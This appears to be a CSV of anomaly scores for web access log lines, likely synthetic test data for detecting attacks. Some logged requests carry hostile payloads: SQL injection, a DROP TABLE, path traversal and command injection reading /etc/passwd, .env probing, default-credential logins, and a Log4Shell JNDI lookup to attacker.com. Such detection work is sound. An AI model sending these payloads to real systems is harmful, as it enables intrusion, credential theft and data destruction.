score_content,score_session,score_fused,score_fused_norm,line
0.2658117115497589,,0.2658117115497589,0.2658117115497589,105.31.138.92 - - [10/Jan/2025:12:09:36 +0000] "GET /assets/app.js HTTP/1.1" 200 10390 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9968924522399902,,1.9968924522399902,1.9968924522399902,212.181.179.155 - - [10/Jan/2025:12:09:38 +0000] "GET /contact HTTP/1.1" 200 10068 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11061.3369140625,,11061.3369140625,11061.3369140625,132.13.174.77 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 500 811 "https://www.google.com/" "python-requests/2.31.0"
24.43372344970703,,24.43372344970703,24.43372344970703,64.25.119.27 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=camera HTTP/1.1" 200 18126 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.28399658203125,,24.28399658203125,24.28399658203125,96.176.162.241 - - [10/Jan/2025:12:09:40 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13226 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.033743381500244,,2.033743381500244,2.033743381500244,51.232.166.114 - - [10/Jan/2025:12:09:44 +0000] "GET /about HTTP/1.1" 200 2212 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.22642168402671814,,0.22642168402671814,0.22642168402671814,111.211.186.102 - - [10/Jan/2025:12:09:46 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18905 "-" "nikto/2.5.0"
0.24664592742919922,,0.24664592742919922,0.24664592742919922,71.72.115.227 - - [10/Jan/2025:12:09:49 +0000] "GET /assets/app.js HTTP/1.1" 200 6232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.454137802124023,,24.454137802124023,24.454137802124023,106.226.141.123 - - [10/Jan/2025:12:09:53 +0000] "GET /api/product?id=123 HTTP/1.1" 204 16447 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.454418182373047,,24.454418182373047,24.454418182373047,64.162.206.140 - - [10/Jan/2025:12:09:55 +0000] "GET /search?q=phone HTTP/1.1" 200 17329 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.35930633544922,,24.35930633544922,24.35930633544922,129.83.100.70 - - [10/Jan/2025:12:10:00 +0000] "GET /search?q=headphones HTTP/1.1" 200 18635 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30126.837890625,,30126.837890625,30126.837890625,15.208.254.121 - - [10/Jan/2025:12:10:02 +0000] "GET / HTTP/1.1" 403 575 "https://example.com/" "python-requests/2.31.0"
0.25526317954063416,,0.25526317954063416,0.25526317954063416,69.137.209.203 - - [10/Jan/2025:12:10:06 +0000] "GET /assets/app.js HTTP/1.1" 200 8002 "-" "sqlmap/1.5.10#stable"
24.384550094604492,,24.384550094604492,24.384550094604492,46.61.152.82 - - [10/Jan/2025:12:10:07 +0000] "GET /search?q=laptop HTTP/1.1" 200 5792 "https://example.com/" "sqlmap/1.5.10#stable"
30149.767578125,,30149.767578125,30149.767578125,37.145.243.49 - - [10/Jan/2025:12:10:11 +0000] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 429 1154 "https://twitter.com/" "nikto/2.5.0"
0.33863481879234314,,0.33863481879234314,0.33863481879234314,155.57.6.135 - - [10/Jan/2025:12:10:13 +0000] "GET /index.html HTTP/1.1" 200 7722 "-" "Wget/1.20.3 (linux-gnu)"
4.852817058563232,,4.852817058563232,4.852817058563232,184.46.236.206 - - [10/Jan/2025:12:10:15 +0000] "GET /api/products HTTP/1.1" 304 11265 "-" "curl/7.68.0"
3.1401078701019287,,3.1401078701019287,3.1401078701019287,221.94.246.19 - - [10/Jan/2025:12:10:15 +0000] "GET /../../etc/passwd HTTP/1.1" 304 17345 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
24.414411544799805,,24.414411544799805,24.414411544799805,188.243.112.203 - - [10/Jan/2025:12:10:19 +0000] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 5261 "https://example.com/" "nikto/2.5.0"
2.0299153327941895,,2.0299153327941895,2.0299153327941895,209.45.97.79 - - [10/Jan/2025:12:10:20 +0000] "GET /profile HTTP/1.1" 200 19398 "https://example.com/" "sqlmap/1.5.10#stable"
30127.966796875,,30127.966796875,30127.966796875,101.218.198.248 - - [10/Jan/2025:12:10:21 +0000] "GET / HTTP/1.1" 429 1173 "-" "python-requests/2.31.0"
24.403100967407227,,24.403100967407227,24.403100967407227,240.128.37.85 - - [10/Jan/2025:12:10:22 +0000] "GET /api/product?id=123 HTTP/1.1" 201 3511 "-" "sqlmap/1.5.10#stable"
1.8939642906188965,,1.8939642906188965,1.8939642906188965,211.182.172.164 - - [10/Jan/2025:12:10:23 +0000] "GET /dashboard HTTP/1.1" 200 3007 "https://example.com/" "sqlmap/1.5.10#stable"
24.21973419189453,,24.21973419189453,24.21973419189453,90.66.202.28 - - [10/Jan/2025:12:10:26 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 2321 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11061.4931640625,,11061.4931640625,11061.4931640625,127.226.97.90 - - [10/Jan/2025:12:10:29 +0000] "GET /search?q=phone HTTP/1.1" 500 847 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.4002685546875,,24.4002685546875,24.4002685546875,205.217.9.76 - - [10/Jan/2025:12:10:29 +0000] "GET /api/product?id=123 HTTP/1.1" 200 2515 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.081278085708618,,2.081278085708618,2.081278085708618,42.188.20.141 - - [10/Jan/2025:12:10:31 +0000] "GET /about HTTP/1.1" 200 12403 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
27.217878341674805,,27.217878341674805,27.217878341674805,242.168.43.156 - - [10/Jan/2025:12:10:35 +0000] "GET /search?q=headphones HTTP/1.1" 302 14233 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
11061.3232421875,,11061.3232421875,11061.3232421875,179.142.185.237 - - [10/Jan/2025:12:10:35 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 500 838 "https://example.com/" "python-requests/2.31.0"
0.3781951069831848,,0.3781951069831848,0.3781951069831848,216.126.40.14 - - [10/Jan/2025:12:10:37 +0000] "GET /index.html HTTP/1.1" 200 18111 "-" "curl/7.68.0"
24.5803279876709,,24.5803279876709,24.5803279876709,53.44.164.75 - - [10/Jan/2025:12:10:40 +0000] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 943 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.398988723754883,,24.398988723754883,24.398988723754883,24.165.140.100 - - [10/Jan/2025:12:10:40 +0000] "GET /search?q=laptop HTTP/1.1" 200 8783 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.421754837036133,,24.421754837036133,24.421754837036133,120.68.58.215 - - [10/Jan/2025:12:10:43 +0000] "GET /search?q=camera HTTP/1.1" 200 14509 "https://twitter.com/" "curl/7.68.0"
2.002241849899292,,2.002241849899292,2.002241849899292,207.139.106.249 - - [10/Jan/2025:12:10:43 +0000] "GET /contact HTTP/1.1" 200 11365 "https://www.google.com/" "python-requests/2.31.0"
30125.01171875,,30125.01171875,30125.01171875,248.138.176.222 - - [10/Jan/2025:12:10:47 +0000] "GET /.env HTTP/1.1" 400 857 "https://twitter.com/" "nikto/2.5.0"
2.0332655906677246,,2.0332655906677246,2.0332655906677246,129.147.231.133 - - [10/Jan/2025:12:10:48 +0000] "GET /about HTTP/1.1" 200 1237 "https://twitter.com/" "python-requests/2.31.0"
0.1737349033355713,,0.1737349033355713,0.1737349033355713,249.55.207.50 - - [10/Jan/2025:12:10:49 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 5577 "-" "curl/7.68.0"
1.7878650426864624,,1.7878650426864624,1.7878650426864624,214.153.67.82 - - [10/Jan/2025:12:10:52 +0000] "GET /server-status HTTP/1.1" 200 4945 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30126.38671875,,30126.38671875,30126.38671875,118.235.224.4 - - [10/Jan/2025:12:10:55 +0000] "GET /dashboard HTTP/1.1" 401 1064 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.40363311767578,,24.40363311767578,24.40363311767578,38.146.151.150 - - [10/Jan/2025:12:10:59 +0000] "GET /search?q=phone HTTP/1.1" 200 5003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30126.576171875,,30126.576171875,30126.576171875,225.106.68.99 - - [10/Jan/2025:12:11:03 +0000] "GET /logout HTTP/1.1" 403 704 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
0.36193564534187317,,0.36193564534187317,0.36193564534187317,37.159.156.175 - - [10/Jan/2025:12:11:07 +0000] "GET /index.html HTTP/1.1" 200 13304 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
4.747330665588379,,4.747330665588379,4.747330665588379,191.122.236.69 - - [10/Jan/2025:12:11:07 +0000] "GET /dashboard HTTP/1.1" 301 1715 "-" "curl/7.68.0"
2.056520700454712,,2.056520700454712,2.056520700454712,220.179.176.26 - - [10/Jan/2025:12:11:09 +0000] "GET /logout HTTP/1.1" 200 16209 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.31999397277832,,27.31999397277832,27.31999397277832,69.187.107.155 - - [10/Jan/2025:12:11:11 +0000] "GET /search?q=camera HTTP/1.1" 304 10614 "-" "sqlmap/1.5.10#stable"
27.3265438079834,,27.3265438079834,27.3265438079834,223.96.211.15 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=phone HTTP/1.1" 302 17024 "https://www.google.com/" "python-requests/2.31.0"
24.431049346923828,,24.431049346923828,24.431049346923828,226.146.8.45 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=laptop HTTP/1.1" 200 17279 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.412097930908203,,24.412097930908203,24.412097930908203,181.51.71.95 - - [10/Jan/2025:12:11:12 +0000] "GET /search?q=camera HTTP/1.1" 200 11908 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
4.845860004425049,,4.845860004425049,4.845860004425049,96.126.153.115 - - [10/Jan/2025:12:11:15 +0000] "GET /contact HTTP/1.1" 301 8027 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9903315305709839,,1.9903315305709839,1.9903315305709839,192.213.177.24 - - [10/Jan/2025:12:11:19 +0000] "GET /profile HTTP/1.1" 200 8575 "-" "curl/7.68.0"
30148.451171875,,30148.451171875,30148.451171875,58.174.53.69 - - [10/Jan/2025:12:11:22 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 401 1325 "https://twitter.com/" "dirb/2.22"
2.2614731788635254,,2.2614731788635254,2.2614731788635254,166.45.154.206 - - [10/Jan/2025:12:11:22 +0000] "GET / HTTP/1.1" 200 4435 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.90718936920166,,4.90718936920166,4.90718936920166,109.230.97.219 - - [10/Jan/2025:12:11:24 +0000] "GET /logout HTTP/1.1" 302 9123 "https://news.ycombinator.com/" "curl/7.68.0"
4.903721809387207,,4.903721809387207,4.903721809387207,150.27.2.131 - - [10/Jan/2025:12:11:26 +0000] "GET /logout HTTP/1.1" 301 13113 "https://example.com/" "sqlmap/1.5.10#stable"
2.0020761489868164,,2.0020761489868164,2.0020761489868164,124.17.87.254 - - [10/Jan/2025:12:11:30 +0000] "GET /logout HTTP/1.1" 200 3642 "https://example.com/" "curl/7.68.0"
2.0592715740203857,,2.0592715740203857,2.0592715740203857,196.62.231.15 - - [10/Jan/2025:12:11:32 +0000] "GET /logout HTTP/1.1" 200 17050 "https://news.ycombinator.com/" "python-requests/2.31.0"
3.141645908355713,,3.141645908355713,3.141645908355713,76.67.233.108 - - [10/Jan/2025:12:11:37 +0000] "GET /assets/app.css HTTP/1.1" 302 16397 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.245288848876953,,24.245288848876953,24.245288848876953,176.137.164.201 - - [10/Jan/2025:12:11:42 +0000] "GET /login?user=admin&pass=admin HTTP/1.1" 200 7386 "https://example.com/" "nikto/2.5.0"
30124.7109375,,30124.7109375,30124.7109375,47.76.25.121 - - [10/Jan/2025:12:11:46 +0000] "GET /assets/app.js HTTP/1.1" 400 1143 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30125.9765625,,30125.9765625,30125.9765625,168.23.57.91 - - [10/Jan/2025:12:11:51 +0000] "GET /assets/app.js HTTP/1.1" 429 687 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9613471031188965,,1.9613471031188965,1.9613471031188965,76.119.218.31 - - [10/Jan/2025:12:11:54 +0000] "GET /dashboard HTTP/1.1" 200 19287 "-" "Wget/1.20.3 (linux-gnu)"
2.0552473068237305,,2.0552473068237305,2.0552473068237305,129.31.223.175 - - [10/Jan/2025:12:11:59 +0000] "GET /about HTTP/1.1" 200 6474 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.22394412755966187,,0.22394412755966187,0.22394412755966187,88.105.253.146 - - [10/Jan/2025:12:12:01 +0000] "GET /assets/app.css HTTP/1.1" 200 6663 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
3.2054712772369385,,3.2054712772369385,3.2054712772369385,86.162.253.46 - - [10/Jan/2025:12:12:03 +0000] "GET /assets/app.js HTTP/1.1" 304 16077 "-" "curl/7.68.0"
4.786828994750977,,4.786828994750977,4.786828994750977,148.196.41.126 - - [10/Jan/2025:12:12:03 +0000] "GET /api/products HTTP/1.1" 302 5624 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.4492130279541,,24.4492130279541,24.4492130279541,99.2.10.137 - - [10/Jan/2025:12:12:07 +0000] "GET /search?q=phone HTTP/1.1" 200 15743 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.933281421661377,,1.933281421661377,1.933281421661377,161.188.64.58 - - [10/Jan/2025:12:12:07 +0000] "GET /api/products HTTP/1.1" 200 235 "https://example.com/" "sqlmap/1.5.10#stable"
0.5641975402832031,,0.5641975402832031,0.5641975402832031,43.17.211.12 - - [10/Jan/2025:12:12:09 +0000] "GET /.env HTTP/1.1" 200 10130 "https://example.com/" "python-requests/2.31.0"
1.901684284210205,,1.901684284210205,1.901684284210205,88.231.126.92 - - [10/Jan/2025:12:12:12 +0000] "GET /dashboard HTTP/1.1" 200 4484 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.117198944091797,,27.117198944091797,27.117198944091797,55.188.6.151 - - [10/Jan/2025:12:12:15 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 302 4399 "-" "curl/7.68.0"
0.34216177463531494,,0.34216177463531494,0.34216177463531494,198.137.160.13 - - [10/Jan/2025:12:12:17 +0000] "GET /index.html HTTP/1.1" 200 8481 "-" "python-requests/2.31.0"
2.041731119155884,,2.041731119155884,2.041731119155884,107.114.98.32 - - [10/Jan/2025:12:12:22 +0000] "GET /admin HTTP/1.1" 200 3894 "https://news.ycombinator.com/" "python-requests/2.31.0"
2.256030559539795,,2.256030559539795,2.256030559539795,170.134.70.160 - - [10/Jan/2025:12:12:27 +0000] "GET / HTTP/1.1" 200 3408 "https://www.google.com/" "python-requests/2.31.0"
1.967103123664856,,1.967103123664856,1.967103123664856,73.30.201.28 - - [10/Jan/2025:12:12:30 +0000] "GET /contact HTTP/1.1" 200 3957 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30126.5078125,,30126.5078125,30126.5078125,92.181.105.76 - - [10/Jan/2025:12:12:34 +0000] "GET /login HTTP/1.1" 400 413 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.809947490692139,,4.809947490692139,4.809947490692139,85.61.1.4 - - [10/Jan/2025:12:12:38 +0000] "GET /api/products HTTP/1.1" 301 15850 "-" "sqlmap/1.5.10#stable"
24.294206619262695,,24.294206619262695,24.294206619262695,200.131.20.186 - - [10/Jan/2025:12:12:38 +0000] "GET /search?q=headphones HTTP/1.1" 200 3051 "-" "sqlmap/1.5.10#stable"
11061.6015625,,11061.6015625,11061.6015625,68.119.13.26 - - [10/Jan/2025:12:12:40 +0000] "GET /search?q=camera HTTP/1.1" 502 606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.898551106452942,,1.898551106452942,1.898551106452942,25.218.195.228 - - [10/Jan/2025:12:12:42 +0000] "GET /dashboard HTTP/1.1" 200 3897 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2813672721385956,,0.2813672721385956,0.2813672721385956,245.160.69.225 - - [10/Jan/2025:12:12:43 +0000] "GET /assets/app.js HTTP/1.1" 200 14443 "-" "sqlmap/1.5.10#stable"
0.27692198753356934,,0.27692198753356934,0.27692198753356934,247.117.70.214 - - [10/Jan/2025:12:12:45 +0000] "GET /assets/app.js HTTP/1.1" 200 13215 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
0.2257874608039856,,0.2257874608039856,0.2257874608039856,252.242.217.41 - - [10/Jan/2025:12:12:48 +0000] "GET /assets/app.js HTTP/1.1" 200 2021 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.414548873901367,,24.414548873901367,24.414548873901367,200.92.157.8 - - [10/Jan/2025:12:12:52 +0000] "GET /search?q=camera HTTP/1.1" 200 12543 "https://www.google.com/" "sqlmap/1.5.10#stable"
30126.537109375,,30126.537109375,30126.537109375,12.17.67.168 - - [10/Jan/2025:12:12:55 +0000] "GET /contact HTTP/1.1" 403 902 "-" "curl/7.68.0"
11061.4951171875,,11061.4951171875,11061.4951171875,224.87.133.134 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 500 1371 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.4477481842041,,24.4477481842041,24.4477481842041,39.215.212.143 - - [10/Jan/2025:12:13:00 +0000] "GET /api/product?id=123 HTTP/1.1" 200 12711 "-" "python-requests/2.31.0"
0.2849530279636383,,0.2849530279636383,0.2849530279636383,219.127.223.43 - - [10/Jan/2025:12:13:00 +0000] "GET /assets/app.js HTTP/1.1" 200 15477 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.059784173965454,,2.059784173965454,2.059784173965454,141.165.97.104 - - [10/Jan/2025:12:13:02 +0000] "GET /login HTTP/1.1" 200 7397 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.428308486938477,,24.428308486938477,24.428308486938477,115.81.31.252 - - [10/Jan/2025:12:13:05 +0000] "GET /search?q=camera HTTP/1.1" 200 16433 "-" "Wget/1.20.3 (linux-gnu)"
0.39519718289375305,,0.39519718289375305,0.39519718289375305,212.24.203.155 - - [10/Jan/2025:12:13:05 +0000] "GET /index.html HTTP/1.1" 200 105 "https://example.com/" "python-requests/2.31.0"
30149.82421875,,30149.82421875,30149.82421875,212.14.210.58 - - [10/Jan/2025:12:13:09 +0000] "GET /search?q=camera HTTP/1.1" 429 744 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
27.209575653076172,,27.209575653076172,27.209575653076172,184.116.30.25 - - [10/Jan/2025:12:13:13 +0000] "GET /search?q=headphones HTTP/1.1" 302 12004 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0427544116973877,,2.0427544116973877,2.0427544116973877,180.28.12.230 - - [10/Jan/2025:12:13:13 +0000] "GET /logout HTTP/1.1" 200 12351 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.41144371032715,,24.41144371032715,24.41144371032715,49.31.239.219 - - [10/Jan/2025:12:13:14 +0000] "GET /search?q=phone HTTP/1.1" 200 6519 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
4.776225566864014,,4.776225566864014,4.776225566864014,194.107.12.238 - - [10/Jan/2025:12:13:17 +0000] "GET /api/products HTTP/1.1" 302 3631 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.43763542175293,,24.43763542175293,24.43763542175293,245.130.35.247 - - [10/Jan/2025:12:13:17 +0000] "GET /search?q=camera HTTP/1.1" 200 19410 "-" "Wget/1.20.3 (linux-gnu)"
30148.58203125,,30148.58203125,30148.58203125,237.131.200.236 - - [10/Jan/2025:12:13:21 +0000] "GET /search?q=phone HTTP/1.1" 400 989 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.27370375394821167,,0.27370375394821167,0.27370375394821167,156.226.83.130 - - [10/Jan/2025:12:13:22 +0000] "GET /assets/app.css HTTP/1.1" 200 19778 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
24.442394256591797,,24.442394256591797,24.442394256591797,249.76.116.207 - - [10/Jan/2025:12:13:26 +0000] "GET /api/product?id=123 HTTP/1.1" 200 11334 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30126.44921875,,30126.44921875,30126.44921875,221.81.183.189 - - [10/Jan/2025:12:13:29 +0000] "GET /logout HTTP/1.1" 400 1121 "https://www.google.com/" "python-requests/2.31.0"
4.864376544952393,,4.864376544952393,4.864376544952393,252.182.167.250 - - [10/Jan/2025:12:13:30 +0000] "GET /logout HTTP/1.1" 301 4447 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.812881946563721,,4.812881946563721,4.812881946563721,144.123.150.147 - - [10/Jan/2025:12:13:34 +0000] "GET /dashboard HTTP/1.1" 302 11642 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
30126.57421875,,30126.57421875,30126.57421875,207.4.134.28 - - [10/Jan/2025:12:13:39 +0000] "GET /logout HTTP/1.1" 403 865 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.26876595616340637,,0.26876595616340637,0.26876595616340637,252.74.175.65 - - [10/Jan/2025:12:13:40 +0000] "GET /wp-login.php HTTP/1.1" 200 5373 "-" "curl/7.68.0"
4.769486904144287,,4.769486904144287,4.769486904144287,92.209.116.27 - - [10/Jan/2025:12:13:45 +0000] "GET /api/products HTTP/1.1" 302 1158 "https://twitter.com/" "python-requests/2.31.0"
24.40226936340332,,24.40226936340332,24.40226936340332,178.171.13.238 - - [10/Jan/2025:12:13:46 +0000] "GET /search?q=laptop HTTP/1.1" 200 9525 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
11039.0595703125,,11039.0595703125,11039.0595703125,4.191.65.52 - - [10/Jan/2025:12:13:49 +0000] "GET /dashboard HTTP/1.1" 500 110 "https://news.ycombinator.com/" "python-requests/2.31.0"
4.903474807739258,,4.903474807739258,4.903474807739258,190.155.51.199 - - [10/Jan/2025:12:13:50 +0000] "GET /profile HTTP/1.1" 302 18011 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0517852306365967,,2.0517852306365967,2.0517852306365967,189.132.31.97 - - [10/Jan/2025:12:13:52 +0000] "GET /about HTTP/1.1" 200 5794 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.23249588906764984,,0.23249588906764984,0.23249588906764984,2.85.120.182 - - [10/Jan/2025:12:13:54 +0000] "GET /assets/app.css HTTP/1.1" 200 8456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.267110586166382,,3.267110586166382,3.267110586166382,126.203.147.141 - - [10/Jan/2025:12:13:55 +0000] "GET /index.html HTTP/1.1" 304 9968 "-" "curl/7.68.0"
30149.849609375,,30149.849609375,30149.849609375,18.202.130.41 - - [10/Jan/2025:12:14:00 +0000] "GET /api/product?id=123 HTTP/1.1" 429 1066 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
1.9833369255065918,,1.9833369255065918,1.9833369255065918,170.85.85.93 - - [10/Jan/2025:12:14:04 +0000] "GET /profile HTTP/1.1" 200 7091 "https://www.google.com/" "curl/7.68.0"
2.29435658454895,,2.29435658454895,2.29435658454895,115.62.232.165 - - [10/Jan/2025:12:14:08 +0000] "GET / HTTP/1.1" 200 11437 "https://twitter.com/" "python-requests/2.31.0"
1.8981159925460815,,1.8981159925460815,1.8981159925460815,99.66.139.186 - - [10/Jan/2025:12:14:09 +0000] "GET /dashboard HTTP/1.1" 200 3815 "-" "curl/7.68.0"
2.0217225551605225,,2.0217225551605225,2.0217225551605225,115.125.12.76 - - [10/Jan/2025:12:14:13 +0000] "GET /profile HTTP/1.1" 200 16770 "https://www.google.com/" "sqlmap/1.5.10#stable"
2.0247907638549805,,2.0247907638549805,2.0247907638549805,137.2.161.17 - - [10/Jan/2025:12:14:15 +0000] "GET /contact HTTP/1.1" 200 17728 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
